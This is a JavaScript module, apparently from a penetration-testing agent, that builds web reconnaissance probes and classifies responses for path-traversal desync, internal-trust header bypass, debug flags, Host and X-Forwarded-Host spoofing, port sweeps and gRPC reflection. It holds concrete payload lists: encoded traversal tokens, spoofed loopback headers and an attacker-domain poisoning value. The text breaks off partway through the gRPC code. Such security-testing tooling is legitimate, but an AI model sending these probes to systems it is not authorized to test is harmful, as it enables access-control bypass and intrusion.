/**
 * headerPortRateRecon.js — header-trust / host-routing / alternate-port /
 * rate-limit recon probe builder and response analyzer.
 *
 * Idea 01141: Path-traversal in route matching — build /api/../admin-style
 * sequences (in several encodings) because gateway path cleaning can
 * desync from backend routing.
 *
 * Idea 01142: X-Internal-Request header trust test — probe internal-trust
 * headers because gateways sometimes pass internal flags straight through
 * to backends.
 *
 * Idea 01143: Debug-header verbose mode test — probe X-Debug, X-Verbose and
 * ?debug=1 because debug flags can enable stack traces and query logging.
 *
 * Idea 01144: Internal endpoint via Host header — probe requests with
 * internal hostnames because virtual-host routing can expose intranet APIs
 * externally.
 *
 * Idea 01145: X-Forwarded-Host routing test — spoof forwarded hosts because
 * apps that generate links or route from this header can expose internal
 * endpoints.
 *
 * Idea 01146: Alternative-port API sweep — plan probes against ports 3000,
 * 5000, 8000, 8080 and 8443 because dev API servers frequently listen on
 * alternate ports publicly.
 *
 * Idea 01147: gRPC default-port probe — build port-50051 reflection probe
 * descriptors because gRPC services often run unencrypted beside the web
 * tier.
 *
 * Idea 01148: Rate-limit threshold mapping — build burst plans per endpoint
 * and record 429 cutoffs, because per-endpoint limits reveal which routes
 * are abuse-sensitive.
 *
 * Idea 01149: Rate-limit header parsing — parse X-RateLimit-* and
 * Retry-After values because headers disclose quota sizes and window logic.
 *
 * Idea 01150: Rate-limit bypass via method change — build variant probes
 * that retry a limited POST as GET/PUT/..., because limiters sometimes key
 * only on specific methods.
 *
 * No network calls: every function builds ready-to-send probe descriptors
 * (method + path/host/port + headers + what-response-signal-to-look-for) or
 * analyzes operator-supplied response records (status codes, headers, body
 * text, timings). The agent's network layer performs the actual transport;
 * this module contains only the pure probe-building and classification
 * logic. Defensive surface mapping of the engagement's own authorized
 * target only — probes are request shapes, never weaponized code.
 */

/**
 * Normalize a probe descriptor into a uniform shape so the agent's network
 * layer can serialize it.
 * @param {object} probe
 * @returns {{label: string, method: string, path: string, headers: object, detect: string}}
 */
function normalizeProbe(probe = {}) {
  return {
    label: String(probe.label || ''),
    method: String(probe.method || 'GET').toUpperCase(),
    path: String(probe.path || ''),
    headers: probe.headers && typeof probe.headers === 'object' ? probe.headers : {},
    detect: String(probe.detect || ''),
  };
}

/**
 * Lowercase header keys for case-insensitive lookup.
 * @param {object} headers
 * @returns {object}
 */
function lowerHeaders(headers = {}) {
  const out = {};
  for (const [k, v] of Object.entries(headers || {})) {
    out[String(k).toLowerCase()] = Array.isArray(v) ? v.join('; ') : String(v);
  }
  return out;
}

/**
 * Median of a numeric array.
 * @param {number[]} values
 * @returns {number|null}
 */
function median(values = []) {
  const sorted = values.filter(v => Number.isFinite(v)).sort((a, b) => a - b);
  if (!sorted.length) return null;
  const mid = Math.floor(sorted.length / 2);
  return sorted.length % 2 ? sorted[mid] : (sorted[mid - 1] + sorted[mid]) / 2;
}

// ---------------------------------------------------------------------------
// Idea 01141 — path-traversal in route matching
// ---------------------------------------------------------------------------

/**
 * Traversal-token encodings used to desync gateway path cleaning from
 * backend routing. The plain `../` is normalized away by most gateways;
 * the encoded variants are the ones that slip through to backends that
 * decode later.
 */
export const TRAVERSAL_TOKENS = [
  '../',        // plain traversal (baseline — usually cleaned)
  '..%2f',      // lowercase percent-encoded slash
  '..%2F',      // uppercase percent-encoded slash
  '%2e%2e%2f',  // fully percent-encoded, lowercase
  '%2E%2E%2F',  // fully percent-encoded, uppercase
  '..%252f',    // double-encoded slash
  '%252e%252e%252f', // double-encoded everything
  '..%c0%af',   // overlong UTF-8 encoded slash
  '%c0%ae%c0%ae%c0%af', // overlong UTF-8 fully encoded
  '..%u002f',   // unicode-escaped slash (IIS/ASP.NET legacy)
  '..;/',       // semicolon param trick (Java/Tomcat)
  '....//',     // nested traversal
  '..././',     // dot-dot-slash with embedded current-dir
  '..\\',       // backslash (Windows backends)
  '..%5c',      // encoded backslash
];

/**
 * Idea 01141 — build path-traversal probe descriptors that splice a
 * traversal sequence between a public prefix and a protected target
 * (e.g. `/api/<token>/admin`), so the operator can detect gateways whose
 * path cleaning desyncs from backend routing.
 * @param {string} publicPrefix - Public route prefix (e.g. "/api").
 * @param {string} protectedTarget - Protected path the traversal reaches for (e.g. "/admin").
 * @param {{tokens?: string[], depths?: number[]}} [options]
 * @returns {object[]} Probe descriptors.
 */
export function buildTraversalSequenceProbes(publicPrefix = '/api', protectedTarget = '/admin', options = {}) {
  const { tokens = TRAVERSAL_TOKENS, depths = [1, 2, 3] } = options;
  const prefix = String(publicPrefix || '/api').replace(/\/+$/, '') || '/api';
  const target = String(protectedTarget || '/admin').replace(/^\/+/, '');
  const probes = [];
  // Baseline probe: protected target requested directly (expect 401/403/404).
  probes.push(normalizeProbe({
    label: 'traversal:baseline-direct',
    path: `/${target}`,
    detect: 'baseline: direct request to the protected target should be rejected or missing',
  }));
  for (const token of tokens || []) {
    for (const depth of depths || []) {
      // Normalize the traversal token so it ends with a path separator
      // (encoded or literal); otherwise the target name would be glued to
      // the encoding with no separator at all.
      const rawToken = String(token);
      const sepToken = /[/\\]$/.test(rawToken) || /%2f$|%5c$|%c0%af$/i.test(rawToken)
        ? rawToken
        : `${rawToken}/`;
      const sequence = sepToken.repeat(Math.max(1, depth));
      probes.push(normalizeProbe({
        label: `traversal:depth${depth}:${rawToken.replace(/[^a-z0-9]/gi, '_')}`,
        path: `${prefix}/${sequence}${target}`,
        detect: `gateway/backend desync if status differs from the baseline (2xx/redirect on a protected target, or a 404-body that leaks the backend stack)`,
      }));
    }
  }
  return probes;
}

/**
 * Idea 01141 — classify traversal-desync signals from operator-supplied
 * response records: any traversal probe whose status (or body signal)
 * differs from the direct-baseline indicates the gateway cleaned the path
 * differently than the backend routed it.
 * @param {{label: string, status?: number, bodySignal?: string|null}[]} records
 * @returns {{desynced: {label: string, status: number, bodySignal: string|null}[], clean: string[], findings: object[]}}
 */
export function classifyTraversalDesync(records = []) {
  const baseline = (records || []).find(r => r && r.label === 'traversal:baseline-direct');
  const baselineStatus = baseline ? Number(baseline.status) : null;
  const desynced = [];
  const clean = [];
  const findings = [];
  for (const r of records || []) {
    if (!r || !r.label || r.label === 'traversal:baseline-direct') continue;
    const status = Number(r.status);
    const bodySignal = r.bodySignal == null ? null : String(r.bodySignal);
    const diverged = baselineStatus !== null && status !== baselineStatus;
    const leakSignal = bodySignal !== null && /stack|trace|exception|denied|forbidden|unauthorized|admin|dashboard/i.test(bodySignal);
    if (diverged || leakSignal) {
      desynced.push({ label: String(r.label), status, bodySignal });
      findings.push({
        type: 'traversal-route-desync',
        confidence: diverged && status >= 200 && status < 400 ? 'high' : 'medium',
        evidence: `Traversal probe "${r.label}" returned ${status}${baselineStatus !== null ? ` vs baseline ${baselineStatus}` : ''}${bodySignal ? ` (body signal: ${bodySignal})` : ''} — gateway path cleaning desyncs from backend routing.`,
        label: String(r.label),
      });
    } else {
      clean.push(String(r.label));
    }
  }
  return { desynced, clean: clean.sort(), findings };
}

// ---------------------------------------------------------------------------
// Idea 01142 — X-Internal-Request header trust test
// ---------------------------------------------------------------------------

/**
 * Internal-trust headers that gateways or apps sometimes honor as
 * "this request came from inside the network". Values are harmless probe
 * markers, not real credentials.
 */
export const INTERNAL_TRUST_HEADERS = {
  'X-Internal-Request': { value: 'true', why: 'explicit internal-request flag' },
  'X-Internal': { value: '1', why: 'generic internal marker' },
  'X-Internal-IP': { value: '127.0.0.1', why: 'claims loopback origin' },
  'X-Originating-IP': { value: '127.0.0.1', why: 'claims loopback origin (mail/proxy style)' },
  'X-Remote-IP': { value: '127.0.0.1', why: 'claims loopback as remote peer' },
  'X-Remote-Addr': { value: '127.0.0.1', why: 'claims loopback as remote address' },
  'X-Forwarded-For-Internal': { value: '10.0.0.1', why: 'claims RFC1918 origin' },
  'X-Real-IP': { value: '127.0.0.1', why: 'overrides perceived client IP' },
  'X-Client-IP': { value: '127.0.0.1', why: 'claims loopback as client' },
  'X-Cluster-Client-IP': { value: '127.0.0.1', why: 'cluster-aware client IP claim' },
  'True-Client-IP': { value: '127.0.0.1', why: 'CDN-style true client IP' },
  'X-Forwarded': { value: 'for=127.0.0.1;by=127.0.0.1', why: 'RFC 7239 forwarded claim' },
  'X-Original-URL': { value: '/admin', why: 'URL-rewrite hint honored by some frameworks' },
  'X-Rewrite-URL': { value: '/admin', why: 'IIS URL-rewrite hint' },
};

/**
 * Idea 01142 — return the internal-trust header dictionary (name →
 * probe value and rationale).
 * @returns {object}
 */
export function internalTrustHeaderDictionary() {
  return JSON.parse(JSON.stringify(INTERNAL_TRUST_HEADERS));
}

/**
 * Idea 01142 — build probe descriptors that attach each internal-trust
 * header to a protected path, plus a no-header baseline for comparison.
 * @param {string} path - Protected path to probe (e.g. "/admin").
 * @param {{headers?: object}} [options]
 * @returns {object[]} Probe descriptors.
 */
export function buildInternalTrustProbes(path = '/admin', options = {}) {
  const { headers = INTERNAL_TRUST_HEADERS } = options;
  const clean = String(path || '/admin').trim() || '/admin';
  const probes = [
    normalizeProbe({
      label: 'internal-trust:baseline',
      path: clean,
      detect: 'baseline: protected path without internal-trust headers should be rejected (401/403)',
    }),
  ];
  for (const [name, spec] of Object.entries(headers || {})) {
    probes.push(normalizeProbe({
      label: `internal-trust:${name}`,
      path: clean,
      headers: { [name]: spec && spec.value != null ? String(spec.value) : 'true' },
      detect: `trust bypass if status is 2xx/3xx where the baseline is 401/403, or the body changes from a login wall to app content`,
    }));
  }
  return probes;
}

/**
 * Idea 01142 — analyze internal-trust probe responses: a probe that
 * succeeds (2xx/3xx) where the baseline was rejected indicates the
 * backend honored the internal-trust header.
 * @param {{label: string, status?: number, bodySignal?: string|null}[]} records
 * @returns {{bypassed: {label: string, header: string, status: number}[], rejected: string[], findings: object[]}}
 */
export function analyzeInternalTrustResponses(records = []) {
  const baseline = (records || []).find(r => r && r.label === 'internal-trust:baseline');
  const baselineRejected = baseline ? [401, 403].includes(Number(baseline.status)) : false;
  const bypassed = [];
  const rejected = [];
  const findings = [];
  for (const r of records || []) {
    if (!r || !r.label || r.label === 'internal-trust:baseline') continue;
    const status = Number(r.status);
    const header = String(r.label).slice('internal-trust:'.length);
    if (baselineRejected && status >= 200 && status < 400) {
      bypassed.push({ label: String(r.label), header, status });
      findings.push({
        type: 'internal-trust-header-bypass',
        confidence: 'high',
        evidence: `Header "${header}" turned a ${baseline.status} baseline into ${status} — the backend treats this internal-trust header as proof of internal origin.`,
        header,
      });
    } else {
      rejected.push(String(r.label));
    }
  }
  return { bypassed, rejected: rejected.sort(), findings };
}

// ---------------------------------------------------------------------------
// Idea 01143 — debug-header verbose mode test
// ---------------------------------------------------------------------------

/**
 * Debug/verbose flags (headers and query params) that can flip an app into
 * verbose mode: stack traces, query logging, profiler output.
 */
export const DEBUG_HEADER_DICTIONARY = {
  headers: {
    'X-Debug': { value: '1', why: 'generic debug flag' },
    'X-Verbose': { value: 'true', why: 'generic verbosity flag' },
    'X-Debug-Mode': { value: '1', why: 'explicit debug mode flag' },
    'X-Profiling': { value: '1', why: 'enables profiler output' },
    'X-Profile': { value: 'true', why: 'enables profiler output (alt name)' },
    'X-Show-Errors': { value: '1', why: 'forces error display' },
    'X-Display-Errors': { value: '1', why: 'PHP-style error display' },
    'X-Trace': { value: '1', why: 'request tracing flag' },
    'X-Request-Trace': { value: '1', why: 'request tracing flag (alt name)' },
  },
  params: {
    debug: { value: '1', why: 'classic ?debug=1 verbose switch' },
    verbose: { value: '1', why: '?verbose=1 verbosity switch' },
    XDEBUG_SESSION_START: { value: '1', why: 'Xdebug session trigger' },
    _debug: { value: '1', why: 'underscore-prefixed debug switch' },
    show_errors: { value: '1', why: 'error-display switch' },
    profile: { value: '1', why: 'profiler switch' },
  },
};

/**
 * Idea 01143 — return the debug-header / debug-param dictionary.
 * @returns {object}
 */
export function debugHeaderDictionary() {
  return JSON.parse(JSON.stringify(DEBUG_HEADER_DICTIONARY));
}

/**
 * Verbose-mode leak signal patterns: stack traces, SQL/query logs,
 * environment/config dumps, profiler markers.
 */
const DEBUG_VERBOSE_PATTERNS = [
  /stack\s*trace/i,
  /traceback\s*\(most recent call/i,
  /at\s+[\w$.]+\s*\([^)]*:\d+:\d+\)/,
  /\bNullPointerException\b/,
  /SELECT\s+[\w*,\s]+\s+FROM\s+\w+/i,          // echoed SQL
  /\b(query|sql)\s*(log|time|duration)\b/i,    // query-log labels
  /\b(DB_PASSWORD|DATABASE_URL|SECRET_KEY|AWS_SECRET)\b/, // env/config dump
  /xdebug/i,
  /profiler/i,
  /<!--\s*DEBUG/i,
  /memory\s*usage/i,
  /execution\s*time/i,
  /loaded\s+modules/i,
];

/**
 * Idea 01143 — build debug/verbose probe descriptors: the same path with
 * each debug header and each debug query param, plus a clean baseline.
 * @param {string} path - Path to probe.
 * @param {{dictionary?: object}} [options]
 * @returns {object[]} Probe descriptors.
 */
export function buildDebugVerboseProbes(path = '/', options = {}) {
  const { dictionary = DEBUG_HEADER_DICTIONARY } = options;
  const clean = String(path || '/').trim() || '/';
  const probes = [
    normalizeProbe({
      label: 'debug-verbose:baseline',
      path: clean,
      detect: 'baseline response without any debug flags',
    }),
  ];
  for (const [name, spec] of Object.entries((dictionary && dictionary.headers) || {})) {
    probes.push(normalizeProbe({
      label: `debug-verbose:header:${name}`,
      path: clean,
      headers: { [name]: spec && spec.value != null ? String(spec.value) : '1' },
      detect: 'verbose mode if the body gains stack traces, query logs, env dumps, or profiler output vs the baseline',
    }));
  }
  for (const [param, spec] of Object.entries((dictionary && dictionary.params) || {})) {
    const value = spec && spec.value != null ? String(spec.value) : '1';
    const sep = clean.includes('?') ? '&' : '?';
    probes.push(normalizeProbe({
      label: `debug-verbose:param:${param}`,
      path: `${clean}${sep}${encodeURIComponent(param)}=${encodeURIComponent(value)}`,
      detect: 'verbose mode if the body gains stack traces, query logs, env dumps, or profiler output vs the baseline',
    }));
  }
  return probes;
}

/**
 * Idea 01143 — scan an operator-supplied response body for verbose-mode
 * signals (stack traces, query logs, env dumps, profiler markers).
 * @param {{label?: string|null, status?: number|null, body?: string}} record
 * @returns {{verbose: boolean, matchedPatterns: string[], categories: string[], findings: object[]}}
 */
export function detectDebugVerboseSignals(record = {}) {
  const { label = null, status = null, body = '' } = record;
  const text = String(body || '');
  const matchedPatterns = [];
  for (const re of DEBUG_VERBOSE_PATTERNS) {
    if (re.test(text)) matchedPatterns.push(re.source);
  }
  const categories = [];
  if (/stack\s*trace|traceback|NullPointerException|at\s+[\w$.]+\s*\(/i.test(text)) categories.push('stack-trace');
  if (/SELECT\s+[\w*,\s]+\s+FROM|query\s*(log|time)/i.test(text)) categories.push('query-log');
  if (/DB_PASSWORD|DATABASE_URL|SECRET_KEY|AWS_SECRET/.test(text)) categories.push('config-dump');
  if (/profiler|xdebug|execution\s*time|memory\s*usage/i.test(text)) categories.push('profiler');
  const verbose = matchedPatterns.length > 0;
  const findings = [];
  if (verbose) {
    findings.push({
      type: 'debug-verbose-mode-enabled',
      confidence: 'high',
      evidence: `Response${label ? ` for probe "${label}"` : ''}${status !== null ? ` (${status})` : ''} leaks verbose internals — ${categories.join(', ') || 'debug markers'} — a debug flag is honored.`,
      label: label == null ? null : String(label),
      categories,
    });
  }
  return { verbose, matchedPatterns, categories, findings };
}

// ---------------------------------------------------------------------------
// Idea 01144 — internal endpoint via Host header
// ---------------------------------------------------------------------------

/**
 * Idea 01144 — build internal-hostname candidates for Host-header
 * probing: loopback forms, RFC1918-style names, and common internal
 * virtual-host prefixes derived from the target domain.
 * @param {string} domain - Public domain (e.g. "example.com").
 * @returns {string[]}
 */
export function internalHostnameCandidates(domain = '') {
  const d = String(domain || '').trim().toLowerCase().replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
  const candidates = [
    'localhost',
    '127.0.0.1',
    '[::1]',
    '0.0.0.0',
    '2130706433',      // 127.0.0.1 as decimal
    '0x7f.0.0.1',      // 127.0.0.1 as hex quads
    '0177.0.0.1',      // 127.0.0.1 as octal quads
  ];
  if (d) {
    const prefixes = ['internal', 'intranet', 'admin', 'dev', 'staging', 'test', 'api-internal', 'backend', 'private', 'corp', 'mgmt', 'ops'];
    for (const p of prefixes) candidates.push(`${p}.${d}`);
    candidates.push(`localhost.${d}`);
    candidates.push(d); // control: the real host itself
  }
  return [...new Set(candidates)];
}

/**
 * Idea 01144 — build Host-header probe descriptors: the same path
 * requested with each internal hostname in the Host header, plus a
 * baseline using the real host.
 * @param {string} path - Path to probe.
 * @param {string[]} hosts - Host header values.
 * @param {{realHost?: string|null}} [options]
 * @returns {object[]} Probe descriptors.
 */
export function buildHostHeaderProbes(path = '/', hosts = [], options = {}) {
  const { realHost = null } = options;
  const clean = String(path || '/').trim() || '/';
  const probes = [];
  if (realHost) {
    probes.push(normalizeProbe({
      label: 'host-header:baseline',
      path: clean,
      headers: { Host: String(realHost) },
      detect: 'baseline response for the real virtual host',
    }));
  }
  for (const h of hosts || []) {
    const host = String(h || '').trim();
    if (!host || (realHost && host === String(realHost))) continue;
    probes.push(normalizeProbe({
      label: `host-header:${host}`,
      path: clean,
      headers: { Host: host },
      detect: 'internal vhost exposed if status/body (title, content-length, login wall) differs from the baseline — intranet API reachable externally',
    }));
  }
  return probes;
}

/**
 * Idea 01144 — analyze Host-header probe responses: hosts whose status
 * or body signal diverges from the baseline indicate virtual-host routing
 * served different (possibly internal) content.
 * @param {{label: string, status?: number, bodySignal?: string|null}[]} records
 * @returns {{exposed: {label: string, host: string, status: number, bodySignal: string|null}[], findings: object[]}}
 */
export function analyzeHostHeaderRouting(records = []) {
  const baseline = (records || []).find(r => r && r.label === 'host-header:baseline');
  const baselineStatus = baseline ? Number(baseline.status) : null;
  const baselineSignal = baseline && baseline.bodySignal != null ? String(baseline.bodySignal) : null;
  const exposed = [];
  const findings = [];
  for (const r of records || []) {
    if (!r || !r.label || r.label === 'host-header:baseline') continue;
    const status = Number(r.status);
    const bodySignal = r.bodySignal == null ? null : String(r.bodySignal);
    const host = String(r.label).slice('host-header:'.length);
    const statusDiverged = baselineStatus !== null && status !== baselineStatus;
    const signalDiverged = baselineSignal !== null && bodySignal !== null && bodySignal !== baselineSignal;
    const successWhereBaselineBlocked = baselineStatus !== null && baselineStatus >= 400 && status >= 200 && status < 400;
    if (statusDiverged || signalDiverged || successWhereBaselineBlocked) {
      exposed.push({ label: String(r.label), host, status, bodySignal });
      findings.push({
        type: 'host-header-internal-vhost',
        confidence: successWhereBaselineBlocked ? 'high' : 'medium',
        evidence: `Host "${host}" returned ${status}${bodySignal ? ` (signal: ${bodySignal})` : ''}${baselineStatus !== null ? ` vs baseline ${baselineStatus}` : ''} — virtual-host routing served different content for an internal hostname.`,
        host,
      });
    }
  }
  return { exposed, findings };
}

// ---------------------------------------------------------------------------
// Idea 01145 — X-Forwarded-Host routing test
// ---------------------------------------------------------------------------

/**
 * Forwarded-host style headers that apps and frameworks consult when
 * generating links, building redirects, or routing requests.
 */
export const FORWARDED_HOST_HEADERS = [
  'X-Forwarded-Host',
  'X-Host',
  'X-Forwarded-Server',
  'X-Original-Host',
  'Forwarded', // RFC 7239: for=..;host=..
];

/**
 * Idea 01145 — build forwarded-host spoof values: internal hostnames,
 * an attacker-controlled domain (link-poisoning check), and delimiter
 * tricks that desync naive parsers.
 * @param {string} internalHost - Internal hostname to smuggle (e.g. "internal.example.com").
 * @param {string} [externalHost] - Attacker-controlled domain for poisoning checks.
 * @returns {string[]}
 */
export function forwardedHostSpoofValues(internalHost = 'internal.example.com', externalHost = 'attacker.example') {
  const internal = String(internalHost || 'internal.example.com').trim();
  const external = String(externalHost || 'attacker.example').trim();
  return [
    internal,
    external,
    `${external}#${internal}`,
    `${external}@${internal}`,
    `${internal}.${external}`,
    `${internal}:443`,
    `${internal}, ${external}`,
    `${internal} ${external}`,
  ];
}

/**
 * Idea 01145 — build X-Forwarded-Host spoof probe descriptors across all
 * forwarded-host header styles, plus a clean baseline.
 * @param {string} path - Path to probe.
 * @param {string[]} spoofs - Spoofed host values.
 * @param {{headers?: string[]}} [options]
 * @returns {object[]} Probe descriptors.
 */
export function buildForwardedHostProbes(path = '/', spoofs = [], options = {}) {
  const { headers = FORWARDED_HOST_HEADERS } = options;
  const clean = String(path || '/').trim() || '/';
  const probes = [
    normalizeProbe({
      label: 'forwarded-host:baseline',
      path: clean,
      detect: 'baseline: links/redirects generated without forwarded-host spoofing',
    }),
  ];
  for (const spoof of spoofs || []) {
    const value = String(spoof || '').trim();
    if (!value) continue;
    const slug = value.replace(/[^a-z0-9]+/gi, '_').slice(0, 40);
    for (const header of headers || []) {
      const headerValue = header === 'Forwarded' ? `for=203.0.113.7;host=${value}` : value;
      probes.push(normalizeProbe({
        label: `forwarded-host:${header}:${slug}`,
        path: clean,
        headers: { [header]: headerValue },
        detect: `forwarded host honored if "${value}" appears in Location headers, absolute links, or password-reset bodies, or routing differs from baseline`,
      }));
    }
  }
  return probes;
}

/**
 * Idea 01145 — analyze forwarded-host probe responses for routing
 * differences and host reflection (link/redirect poisoning signals).
 * @param {{label: string, status?: number, location?: string|null, bodySignal?: string|null}[]} records
 * @returns {{honored: {label: string, header: string, spoof: string, status: number}[], findings: object[]}}
 */
export function analyzeForwardedHostRouting(records = []) {
  const baseline = (records || []).find(r => r && r.label === 'forwarded-host:baseline');
  const baselineStatus = baseline ? Number(baseline.status) : null;
  const honored = [];
  const findings = [];
  for (const r of records || []) {
    if (!r || !r.label || r.label === 'forwarded-host:baseline') continue;
    const status = Number(r.status);
    const location = r.location == null ? null : String(r.location);
    const bodySignal = r.bodySignal == null ? null : String(r.bodySignal);
    const rest = String(r.label).slice('forwarded-host:'.length);
    const header = rest.split(':')[0];
    const statusDiverged = baselineStatus !== null && status !== baselineStatus;
    const reflected = (location && /attacker\.example|internal\.example/i.test(location)) ||
      (bodySignal && /attacker\.example|internal\.example/i.test(bodySignal));
    if (statusDiverged || reflected) {
      honored.push({ label: String(r.label), header, spoof: rest.slice(header.length + 1), status });
      findings.push({
        type: 'forwarded-host-honored',
        confidence: reflected ? 'high' : 'medium',
        evidence: `Forwarded-host probe "${r.label}" ${reflected ? `reflected the spoofed host (Location: ${location || 'n/a'}, body signal: ${bodySignal || 'n/a'})` : `returned ${status} vs baseline ${baselineStatus}`} — the app routes or generates links from ${header}.`,
        header,
      });
    }
  }
  return { honored, findings };
}

// ---------------------------------------------------------------------------
// Idea 01146 — alternative-port API sweep
// ---------------------------------------------------------------------------

/**
 * Common alternate ports where dev/staging API servers listen publicly.
 */
export const ALTERNATE_API_PORTS = [3000, 5000, 8000, 8080, 8443];

/**
 * Extra alternate ports worth a second pass when the primary sweep finds
 * nothing (framework defaults, admin panels, metrics).
 */
export const EXTENDED_ALTERNATE_PORTS = [4000, 4200, 5001, 7000, 7001, 8001, 8888, 9000, 9090, 9443];

/**
 * Idea 01146 — build a port-sweep plan: for each alternate port, the
 * schemes to try (http always; https for 8443/9443-style ports and as a
 * fallback) and the probe paths to request.
 * @param {string} host - Target host (no scheme, no port).
 * @param {{ports?: number[], paths?: string[], includeExtended?: boolean}} [options]
 * @returns {{host: string, targets: {port: number, schemes: string[], paths: string[]}[]}}
 */
export function alternatePortSweepPlan(host = '', options = {}) {
  const { ports = ALTERNATE_API_PORTS, paths = ['/', '/api', '/health', '/status'], includeExtended = false } = options;
  const cleanHost = String(host || '').trim().replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
  const portList = includeExtended ? [...new Set([...(ports || []), ...EXTENDED_ALTERNATE_PORTS])] : (ports || []);
  const targets = [];
  for (const port of portList) {
    const p = Number(port);
    if (!Number.isInteger(p) || p < 1 || p > 65535) continue;
    const schemes = p === 443 || p === 8443 || p === 9443 ? ['https', 'http'] : ['http', 'https'];
    targets.push({ port: p, schemes, paths: (paths || []).map(x => String(x)) });
  }
  return { host: cleanHost, targets: targets.sort((a, b) => a.port - b.port) };
}

/**
 * Idea 01146 — expand a sweep plan into concrete probe descriptors the
 * network layer can execute (one per port × scheme × path).
 * @param {{host: string, targets: {port: number, schemes: string[], paths: string[]}[]}} plan
 * @returns {object[]} Probe descriptors with `target` metadata.
 */
export function buildAlternatePortProbes(plan = {}) {
  const probes = [];
  const host = String((plan && plan.host) || '');
  if (!host) return probes;
  for (const t of (plan && plan.targets) || []) {
    for (const scheme of t.schemes || []) {
      for (const path of t.paths || []) {
        probes.push({
          ...normalizeProbe({
            label: `alt-port:${t.port}:${scheme}:${path}`,
            path: String(path),
            detect: `service exposed if the connection succeeds and returns an API-shaped response (JSON body, API headers, or a framework banner) on this non-standard port`,
          }),
          target: { host, port: Number(t.port), scheme: String(scheme), url: `${scheme}://${host}:${t.port}${path}` },
        });
      }
    }
  }
  return probes;
}

/**
 * Idea 01146 — classify port-sweep results from operator-supplied
 * records into open services vs closed/filtered ports.
 * @param {{label: string, port?: number, scheme?: string, reachable?: boolean, status?: number|null, banner?: string|null}[]} records
 * @returns {{open: {port: number, schemes: string[], statuses: number[], banners: string[]}[], closed: number[], findings: object[]}}
 */
export function classifyPortSweepResults(records = []) {
  const byPort = new Map();
  for (const r of records || []) {
    if (!r || r.port == null) continue;
    const port = Number(r.port);
    if (!byPort.has(port)) byPort.set(port, { schemes: new Set(), statuses: new Set(), banners: new Set(), reachable: false });
    const rec = byPort.get(port);
    if (r.scheme) rec.schemes.add(String(r.scheme));
    if (r.status != null) rec.statuses.add(Number(r.status));
    if (r.banner) rec.banners.add(String(r.banner));
    if (r.reachable) rec.reachable = true;
  }
  const open = [];
  const closed = [];
  const findings = [];
  for (const [port, rec] of [...byPort.entries()].sort((a, b) => a[0] - b[0])) {
    if (rec.reachable) {
      open.push({
        port,
        schemes: [...rec.schemes].sort(),
        statuses: [...rec.statuses].sort((a, b) => a - b),
        banners: [...rec.banners].sort(),
      });
      findings.push({
        type: 'alternate-port-service-exposed',
        confidence: 'high',
        evidence: `Port ${port} is reachable${rec.schemes.size ? ` over ${[...rec.schemes].join('/')}` : ''}${rec.statuses.size ? ` (HTTP ${[...rec.statuses].join(', ')})` : ''}${rec.banners.size ? ` — banner: ${[...rec.banners].join('; ')}` : ''} — a service listens on this alternate port.`,
        port,
      });
    } else {
      closed.push(port);
    }
  }
  return { open, closed, findings };
}

// ---------------------------------------------------------------------------
// Idea 01147 — gRPC default-port probe
// ---------------------------------------------------------------------------

/**
 * gRPC well-known defaults: plaintext default port and the server
 * reflection service names (v1 and the legacy v1alpha).
 */
export const GRPC_DEFAULT_PORT = 50051;
export const GRPC_REFLECTION_SERVICES = [
  'grpc.reflection.v1.ServerReflection',
  'grpc.reflection.v1alpha.ServerReflection',
];

/**
 * Idea 01147 — build gRPC probe descriptors for the default port: an
 * HTTP/2 prior-knowledge handshake shape and server-reflection service
 * probes, so the operator can confirm a gRPC service beside the web tier.
 * @param {string} host - Target host.
 * @param {{port?: number, services?: string[]}} [options]
 * @returns {object[]} Probe descriptors with `target` metadata.
 */
export function buildGrpcPortProbes(host = '', options = {}) {
  const { port = GRPC_DEFAULT_PORT, services = GRPC_REFLECTION_SERVICES } = options;
  const cleanHost = String(host || '').trim().replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
  if (!cleanHost) return [];
  const probes = [];
  probes.push({
    ...normalizeProbe({
      label: `grpc:handshake:${port}`,
      path: '/',
      method: 'PRI',
      detect: 'gRPC/HTTP2 service if the server answers an HTTP/2 prior-knowledge preface (SETTINGS frame) instead of resetting the connection',
    }),
    target: { host: cleanHost, port: Number(port), protocol: 'h2c-prior-knowledge', service: null },
  });
  for (const service of services || []) {
    probes.push({
      ...normalizeProbe({
        label: `grpc:reflection:${service}`,
        path: `/${service}/ServerReflectionInfo`,
        method: 'POST',
        headers: { 'Content-Type': 'application/grpc', TE: 'trailers' },
        detect: `reflection enabled if the server returns grpc-status trailers (0 = OK) or a FileDescriptorProto stream instead of "unknown service" (grpc-status 12)`,
      }),
      target: { host: cleanHost, port: Number(port), protocol: 'grpc', service: String(service) },
    });
  }
  return probes;
}

/**
 * Idea 01147 — parse operator-supplied gRPC probe responses for
 * protocol indicators: application/grpc content type, grpc-status
 * trailers, HTTP/2 ALPN, or plaintext-HTTP/2 preface acceptance.
 * @param {{label?: string|null, headers?: object, alpn?: string|null, prefaceAccepted?: boolean|null, grpcStatus?: number|null}} record
 * @returns {{grpcDetected: boolean, reflectionEnabled: boolean|null, indicators: string[], findings: object[]}}
 */
export function parseGrpcReflectionIndicators(record = {}) {
  const { label = null, headers = {}, alpn = null, prefaceAccepted = null, grpcStatus = null } = record;
  const lower = lowerHeaders(headers);
  const indicators = [];
  const contentType = lower['content-type'] || '';
  if (/application\/grpc/i.test(contentType)) indicators.push('content-type: application/grpc');
  if (lower['grpc-status'] != null) indicators.push(`grpc-status: ${lower['grpc-status']}`);
  if (lower['grpc-message'] != null) indicators.push(`grpc-message: ${lower['grpc-message']}`);
  if (alpn && /^h2$/i.test(String(alpn))) indicators.push('alpn: h2');
  if (prefaceAccepted === true) indicators.push('h2c prior-knowledge preface accepted');
  const grpcDetected = indicators.length > 0;
  let reflectionEnabled = null;
  if (grpcStatus !== null && grpcStatus !== undefined) {
    reflectionEnabled = Number(grpcStatus) === 0;
    indicators.push(reflectionEnabled ? 'reflection call accepted (grpc-status 0)' : `reflection rejected (grpc-status ${grpcStatus})`);
  }
  const findings = [];
  if (grpcDetected) {
    findings.push({
      type: 'grpc-service-detected',
      confidence: 'high',
      evidence: `gRPC indicators on probe${label ? ` "${label}"` : ''}: ${indicators.join('; ')}.`,
      label: label == null ? null : String(label),
      reflectionEnabled,
    });
  }
  if (reflectionEnabled === true) {
    findings.push({
      type: 'grpc-reflection-enabled',
      confidence: 'high',
      evidence: 'gRPC server reflection is enabled — the operator can enumerate the full service/method surface from the reflection stream.',
      label: label == null ? null : String(label),
    });
  }
